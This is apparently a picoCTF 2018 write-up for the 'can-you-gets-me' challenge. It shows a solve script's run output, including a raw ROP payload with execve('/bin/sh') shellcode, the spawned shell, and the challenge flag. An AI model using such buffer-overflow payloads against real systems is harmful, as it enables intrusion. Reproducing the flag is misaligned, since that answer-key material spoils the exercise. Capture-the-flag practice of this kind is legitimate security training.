# can-you-gets-me - Points: 650 - (Solves: 176)

Can you exploit the following [program][1] to get a flag?
You may need to think return-oriented if you want to program your way to the flag
You can find the program in
/problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40 on the shell server
[Source][2]

[1]: https://2018shell2.picoctf.com/static/1120b16ef97aa6fd03344d933ede82f2/gets
[2]: https://2018shell2.picoctf.com/static/1120b16ef97aa6fd03344d933ede82f2/gets.c

## Hints

This is a classic gets ROP

---

```sh
% py solve.py
[*] '/home/zzzz/pico18/can-you-gets-me/gets'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded cached gadgets for 'gets'
[+] Starting local process './gets': pid 1223126
[*] Sending: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA*\xf0\x06\x08\xec\x9f\x0e\x08\x03\x93\x04\x08o\xa8\x07\x08o\xa8\x07\x08o\xa8\x07\x08o\xa8\x07\x08o\xa8\x07\x08o\xa8\x07\x08o\xa8\x07\x08\xdbI\x05\x08\xc6\x81\x0b\x08\xc8\x9f\x0e\x08@\xa1\t\x08\xd6\x81\x0b\x081\xc9\xf7\xe1\xb0\x0bQh//shh/bin\x89\xe3\xcd\x80'
[+] Here are your shell!
[*] Switching to interactive mode
total 20
drwxrwxr-x 2 zzzz zzzz 4096 Oct 10 16:18 .
drwxrwxr-x 4 zzzz zzzz 4096 Oct  9 20:48 ..
lrwxrwxrwx 1 zzzz zzzz   69 Oct 10 16:17 flag.txt -> /problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40/flag.txt
lrwxrwxrwx 1 zzzz zzzz   65 Oct 10 16:18 gets -> /problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40/gets
-rw-rw-r-- 1 zzzz zzzz 3095 Oct 10 16:01 solve.py
$ cat flag.txt
picoCTF{rOp_yOuR_wAY_tO_AnTHinG_f5072d23}
```
